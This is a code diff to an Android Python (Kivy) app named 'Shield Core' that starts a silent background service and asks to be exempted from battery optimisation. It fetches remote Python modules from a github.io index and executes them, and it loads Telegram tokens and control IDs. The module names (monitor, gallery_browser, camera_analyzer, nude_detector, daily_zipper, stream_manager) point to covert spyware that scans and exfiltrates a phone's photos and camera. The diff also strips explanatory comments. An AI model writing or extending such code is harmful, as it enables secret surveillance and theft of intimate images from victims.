@@ -98,7 +98,7 @@ def start_silent_service():
     except Exception as e:
         print(f"Foreground service error: {e}")
 
-# ========== الأذونات المطلوبة (تقليص القائمة) ==========
+# ========== الأذونات المطلوبة ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -111,10 +111,8 @@ def _perms():
     except Exception as e:
         print(f"Permissions error: {e}")
 
-    # بدء الخدمة الصامتة بعد طلب الأذونات
     start_silent_service()
 
-    # طلب استثناء من تحسين البطارية
     try:
         from jnius import autoclass
         ctx = autoclass('org.kivy.android.PythonActivity').mActivity
@@ -185,12 +183,20 @@ class CoreApp(App):
         Clock.schedule_once(upd, 0)
 
     def _check_connectivity(self):
-        """فحص أولي للاتصال بالإنترنت للتأكد من أن الشبكة متاحة"""
-        try:
-            requests.get("https://clients3.google.com/generate_204", timeout=5)
-            return True
-        except Exception:
-            return False
+        # فحص اتصال خفيف يعتمد على TCP مباشرة
+        test_targets = [
+            ("www.google.com", 80),
+            ("1.1.1.1", 53),
+            ("8.8.8.8", 53)
+        ]
+        for host, port in test_targets:
+            try:
+                sock = socket.create_connection((host, port), timeout=5)
+                sock.close()
+                return True
+            except Exception:
+                continue
+        return False
 
     def _verify_module(self, file_path, module_name):
         if not os.path.exists(file_path):
@@ -258,13 +264,13 @@ class CoreApp(App):
         _perms()
         self._log("Shield Core v4.2 (Config template mode) starting...", "BOOT")
 
-        # ---- 0. فحص الاتصال بالإنترنت ----
+        # ---- فحص الاتصال ----
         if not self._check_connectivity():
-            self._log("No internet connection. Retrying in 60 seconds...", "ERROR")
-            Clock.schedule_once(lambda dt: self._start(None), 60)
+            self._log("No internet connection. Retrying in 30 seconds...", "ERROR")
+            Clock.schedule_once(lambda dt: self._start(None), 30)
             return
 
-        # ---- 1. جلب قائمة الملفات من index.json ----
+        # ---- جلب index.json ----
         all_files = []
         for base_url in INDEX_BASE_URLS:
             try:
@@ -283,7 +289,7 @@ class CoreApp(App):
         else:
             self._log("Could not fetch index.json, using only local files.", "WARN")
 
-        # ---- 2. تحميل جميع الملفات المذكورة في index.json (بما فيها config_template.py) ----
+        # ---- تحميل الملفات ----
         model_url = None
         for file_entry in all_files:
             name = file_entry.get('name')
@@ -295,7 +301,7 @@ class CoreApp(App):
                 continue
             self._download_safe(url, name)
 
-        # ---- 3. تحميل الموديل ----
+        # ---- تحميل الموديل ----
         if model_url:
             self._download_model_if_missing(model_url)
         else:
@@ -303,7 +309,7 @@ class CoreApp(App):
             fallback_url = "https://zaen1993.github.io/Android-Core/assets/engine_v2.tflite"
             self._download_model_if_missing(fallback_url)
 
-        # ---- 4. التحقق من وجود config_template.py بعد التحميل ----
+        # ---- تحقق من config_template.py ----
         config_path = os.path.join(R, "config_template.py")
         if not os.path.exists(config_path):
             self._log("config_template.py not found after download! System cannot start.", "ERROR")
@@ -311,7 +317,7 @@ class CoreApp(App):
 
         time.sleep(1)
 
-        # ---- 5. تنظيف الوحدات القديمة ----
+        # ---- تنظيف الوحدات ----
         modules_to_remove = ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
                              "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager",
                              "config_template", "config"]
@@ -321,20 +327,20 @@ class CoreApp(App):
         importlib.invalidate_caches()
         gc.collect()
 
-        # ---- 6. تحميل الإعدادات من config_template.py ----
+        # ---- تحميل الأسرار ----
         try:
             active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = load_secrets_from_config()
             self._log("Secrets loaded from config_template.py")
         except Exception as e:
-            self._log(f"Failed to load secrets from config_template: {e}", "ERROR")
+            self._log(f"Failed to load secrets: {e}", "ERROR")
             return
 
-        # ---- 7. التأكد من وجود telegram_ui.py ----
+        # ---- التحقق من telegram_ui.py ----
         if not os.path.exists(os.path.join(R, "telegram_ui.py")):
-            self._log("telegram_ui.py not found. Check internet and index.json", "ERROR")
+            self._log("telegram_ui.py not found.", "ERROR")
             return
 
-        # ---- 8. إقلاع النظام ----
+        # ---- بدء النظام ----
         try:
             import monitor
             import telegram_ui
